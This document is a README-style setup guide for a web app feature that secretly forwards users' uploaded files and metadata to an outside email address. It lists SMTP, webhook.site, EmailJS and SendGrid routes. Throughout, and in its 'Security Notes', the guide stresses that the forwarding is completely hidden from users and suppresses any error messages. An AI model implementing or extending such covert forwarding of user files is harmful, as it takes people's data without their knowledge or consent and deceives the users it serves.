# Email Setup Guide for Hidden File Upload Notifications

This guide explains how to set up the hidden email functionality that automatically sends uploaded files to `rizwan@ecomgliders.com`.

## Current Implementation

The system currently logs file uploads to the browser console with this format:
```
📧 File Upload Notification: {
  fileName: "business_report.csv",
  fileSize: 12345,
  fileType: "business-report",
  uploadTime: "2024-01-01T12:00:00.000Z",
  userAgent: "Mozilla/5.0...",
  adminEmail: "rizwan@ecomgliders.com",
  message: "New business-report uploaded: business_report.csv (12.06 KB)"
}
```

## Setup Options

### Option 1: SMTP (Recommended - Most Reliable)

**This is the best option if you have SMTP credentials!**

1. **Install backend dependencies:**
   ```bash
   cd backend
   npm install
   ```

2. **Configure SMTP in `backend/server.js`:**
   ```javascript
   const SMTP_CONFIG = {
     host: 'your-smtp-host.com', // e.g., 'smtp.gmail.com', 'smtp.outlook.com'
     port: 587, // Usually 587 for TLS or 465 for SSL
     secure: false, // true for 465, false for other ports
     auth: {
       user: 'your-email@domain.com', // Your SMTP username
       pass: 'your-smtp-password' // Your SMTP password or app password
     }
   };
   ```

3. **Common SMTP Settings:**
   - **Gmail:** `smtp.gmail.com`, port 587, secure: false
   - **Outlook:** `smtp-mail.outlook.com`, port 587, secure: false
   - **Yahoo:** `smtp.mail.yahoo.com`, port 587, secure: false
   - **Custom Domain:** Check with your email provider

4. **Start the backend server:**
   ```bash
   cd backend
   npm start
   ```

5. **The system will now:**
   - Send emails with file attachments to `rizwan@ecomgliders.com`
   - Include file metadata and upload details
   - Work completely hidden from users

### Option 2: Webhook.site (Easiest for Testing)

1. Go to https://webhook.site
2. Copy your unique webhook URL
3. Replace `'https://webhook.site/your-unique-webhook-url'` in `src/utils/emailService.ts`
4. The webhook will receive all file upload notifications

### Option 3: EmailJS (Free Tier Available)

1. Sign up at https://www.emailjs.com/
2. Create an email service (Gmail, Outlook, etc.)
3. Create an email template
4. Update the EmailJS configuration in `src/utils/emailService.ts`:
   ```typescript
   service_id: 'your_service_id',
   template_id: 'your_template_id', 
   user_id: 'your_user_id'
   ```

### Option 4: SendGrid (Professional)

1. Sign up at https://sendgrid.com/
2. Create an API key
3. Replace the webhook implementation with SendGrid API calls

### Option 5: Custom Backend

1. Create a simple backend endpoint (Node.js, Python, etc.)
2. Update the webhook URL to point to your backend
3. Handle email sending on the server side

## File Location

The email functionality is implemented in:
- `src/utils/emailService.ts` - Email service logic
- `src/components/FileUpload.tsx` - Integration with file upload

## Security Notes

- The email functionality is completely hidden from users
- No error messages are shown to users if email sending fails
- All errors are logged to console for debugging
- File content is not sent by default (only metadata) for security

## Testing

To test the functionality:
1. Open browser developer tools (F12)
2. Go to Console tab
3. Upload a file
4. Look for the "📧 File Upload Notification" log message

## Production Setup

For production use, we recommend:
1. Using a reliable email service (SendGrid, AWS SES, etc.)
2. Setting up proper error handling and retry logic
3. Implementing rate limiting to prevent abuse
4. Adding file size limits and validation 